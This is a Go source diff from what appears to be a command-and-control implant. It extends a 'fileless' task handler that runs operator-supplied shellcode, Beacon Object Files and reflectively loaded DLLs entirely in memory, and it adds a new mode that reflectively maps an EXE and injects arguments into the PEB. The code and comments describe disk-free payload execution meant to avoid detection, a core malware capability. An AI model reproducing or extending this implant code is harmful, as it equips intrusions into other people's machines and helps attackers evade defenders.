@@ -1717,16 +1717,19 @@ func executeTask(task Task) Result {
 }
 
 // handleFilelessExec 全内存无文件执行入口。
-// task.Data 为 JSON：{"kind":"shellcode|bof|dll","payload_b64":"...","args":"...","entry":"..."}
+// task.Data 为 JSON：{"kind":"shellcode|bof|dll|exe_mem","payload_b64":"...","args":"...","entry":"...","wait_ms":0}
 //   - shellcode：VirtualAlloc + CreateThread，全程不落盘；
 //   - bof：内存 COFF 执行（Beacon Object File），不落盘；
-//   - dll：反射式 PE 加载（映射 + 重定位 + 导入表修复 + 调 DllMain），不落盘、不走 LoadLibrary(路径)。
+//   - dll：反射式 PE 加载（映射 + 重定位 + 导入表修复 + 调 DllMain），不落盘、不走 LoadLibrary(路径)；
+//   - exe_mem：反射式映射 EXE 并 CreateThread 到入口点，args 作为命令行注入 PEB
+//     （要求与植入体同架构；不重定向 stdout，需要输出请用落地执行）。
 func handleFilelessExec(data string) (string, int32, string) {
 	var req struct {
 		Kind       string `json:"kind"`
 		PayloadB64 string `json:"payload_b64"`
 		Args       string `json:"args"`
 		Entry      string `json:"entry"`
+		WaitMs     int    `json:"wait_ms"`
 	}
 	if err := json.Unmarshal([]byte(data), &req); err != nil {
 		return "", -1, fmt.Sprintf("parse fileless_exec data failed: %v", err)
@@ -1742,6 +1745,8 @@ func handleFilelessExec(data string) (string, int32, string) {
 		return loadBOF(req.PayloadB64, req.Args)
 	case "dll":
 		return loadDLLMem(req.PayloadB64, req.Entry)
+	case "exe_mem":
+		return loadEXEMem(req.PayloadB64, req.Args, req.Entry, req.WaitMs)
 	default:
 		return "", -1, fmt.Sprintf("unsupported fileless kind: %q", req.Kind)
 	}
